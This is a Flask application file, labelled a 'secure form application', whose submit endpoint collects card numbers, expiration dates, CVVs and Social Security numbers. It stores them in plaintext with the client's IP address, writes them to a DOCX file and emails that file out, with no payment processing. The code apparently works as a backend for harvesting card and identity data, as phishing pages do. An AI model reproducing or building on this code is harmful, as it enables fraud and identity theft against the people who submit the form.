"""
Secure Form Application - Main Flask Application
"""
from flask import Flask, render_template, request, jsonify
from flask_wtf.csrf import CSRFProtect, generate_csrf
from config import Config
from models import db, FormSubmission
from utils.validators import (
    validate_card_number, validate_expiration_date, 
    validate_cvv, validate_ssn, validate_name, sanitize_input
)
from utils.docx_generator import generate_submission_docx
from utils.email_service import init_mail, send_submission_email
from datetime import datetime
import logging
import os

# Initialize Flask app
app = Flask(__name__)
app.config.from_object(Config)
Config.init_app(app)

# Initialize extensions
db.init_app(app)
csrf = CSRFProtect(app)
init_mail(app)

# Register blueprints
from admin import admin_bp
app.register_blueprint(admin_bp)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Create database tables
with app.app_context():
    try:
        db.create_all()
        logger.info("Database tables created successfully")
    except Exception as e:
        logger.error(f"Error creating database tables: {e}")

@app.route('/')
def index():
    """Render the main form page"""
    return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    """Return empty response for favicon to prevent 404s"""
    return '', 204

@app.route('/submit', methods=['POST'])
def submit_form():
    """
    Handle form submission
    
    Expected JSON payload:
    {
        "name_on_card": str,
        "card_type": str,
        "card_number": str,
        "expiration_date": str,
        "cvv": str,
        "ssn": str
    }
    
    Returns:
        JSON response with success/error status
    """
    try:
        # Get JSON data
        data = request.get_json()
        
        if not data:
            return jsonify({
                'success': False,
                'error': 'No data provided'
            }), 400
        
        # Extract and sanitize form fields
        name_on_card = sanitize_input(data.get('name_on_card', ''))
        card_type = sanitize_input(data.get('card_type', ''))
        card_number = sanitize_input(data.get('card_number', ''))
        expiration_date = sanitize_input(data.get('expiration_date', ''))
        cvv = sanitize_input(data.get('cvv', ''))
        ssn = sanitize_input(data.get('ssn', ''))
        
        # Validate all fields
        errors = {}
        
        # Validate name
        is_valid, error_msg = validate_name(name_on_card)
        if not is_valid:
            errors['name_on_card'] = error_msg
        
        # Validate card type
        if card_type not in ['Credit Card', 'Debit Card']:
            errors['card_type'] = 'Please select a valid card type'
        
        # Validate card number
        is_valid, error_msg = validate_card_number(card_number)
        if not is_valid:
            errors['card_number'] = error_msg
        
        # Validate expiration date
        is_valid, error_msg = validate_expiration_date(expiration_date)
        if not is_valid:
            errors['expiration_date'] = error_msg
        
        # Validate CVV
        is_valid, error_msg = validate_cvv(cvv, card_type)
        if not is_valid:
            errors['cvv'] = error_msg
        
        # Validate SSN
        is_valid, error_msg = validate_ssn(ssn)
        if not is_valid:
            errors['ssn'] = error_msg
        
        # If there are validation errors, return them
        if errors:
            return jsonify({
                'success': False,
                'errors': errors
            }), 400
        
        # Get client IP address
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Create new submission in database
        submission = FormSubmission(
            name_on_card=name_on_card,
            card_type=card_type,
            card_number=card_number,
            expiration_date=expiration_date,
            cvv=cvv,
            ssn=ssn,
            ip_address=ip_address
        )
        
        db.session.add(submission)
        db.session.commit()
        
        logger.info(f"New submission created with ID: {submission.id}")
        
        # Generate DOCX document
        docx_path = None
        try:
            docx_path = generate_submission_docx(submission.to_dict(), submission.id)
            submission.docx_filename = docx_path.name
            
            # Store document in database as well
            with open(docx_path, 'rb') as doc_file:
                submission.document_data = doc_file.read()
            
            db.session.commit()
            logger.info(f"DOCX generated and stored: {docx_path.name}")
        except Exception as e:
            logger.error(f"Error generating DOCX: {str(e)}")
            # Continue even if DOCX generation fails, as we have the data in DB
        
        # Send email notification
        try:
            success, message = send_submission_email(submission.to_dict(), docx_path)
            if success:
                submission.email_sent = True
                submission.email_sent_at = datetime.utcnow()
                db.session.commit()
                logger.info(f"Email sent successfully for submission {submission.id}")
            else:
                logger.warning(f"Email not sent for submission {submission.id}: {message}")
        except Exception as e:
            logger.error(f"Error sending email: {str(e)}")
            # Continue even if email fails
        
        return jsonify({
            'success': True,
            'message': 'Form submitted successfully!',
            'submission_id': submission.id,
            'confirmation_number': f'CONF-{submission.id:06d}'
        }), 200
        
    except Exception as e:
        logger.error(f"Error processing form submission: {str(e)}")
        db.session.rollback()
        
        return jsonify({
            'success': False,
            'error': 'An error occurred while processing your submission. Please try again.'
        }), 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'healthy'}), 200

@app.after_request
def set_csrf_cookie(response):
    """Set CSRF cookie for client-side access if needed"""
    response.set_cookie('csrf_token', generate_csrf())
    return response

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logger.error(f"Internal error: {str(error)}")
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    # Run the application
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=app.config['DEBUG']
    )
